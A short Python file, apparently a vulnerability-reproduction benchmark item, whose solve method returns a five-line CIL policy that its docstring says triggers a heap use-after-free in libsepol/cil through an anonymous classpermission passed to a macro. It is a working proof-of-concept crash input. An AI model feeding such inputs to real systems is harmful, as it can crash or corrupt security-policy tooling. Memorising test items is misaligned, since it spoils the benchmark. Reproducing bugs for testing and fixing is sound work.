import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in libsepol/cil.
        The vulnerability occurs when an anonymous classpermission is passed into a macro
        that uses a classpermissionset rule. The anonymous classpermission is destroyed
        twice during AST destruction: once by the macro expansion cleanup and once by the
        call argument cleanup.
        """
        # Minimal CIL policy to trigger the vulnerability
        poc = (
            "(class c (p))\n"
            "(macro m ((classpermission a))\n"
            "    (classpermissionset a (c (p)))\n"
            ")\n"
            "(call m ((c (p))))\n"
        )
        return poc.encode('utf-8')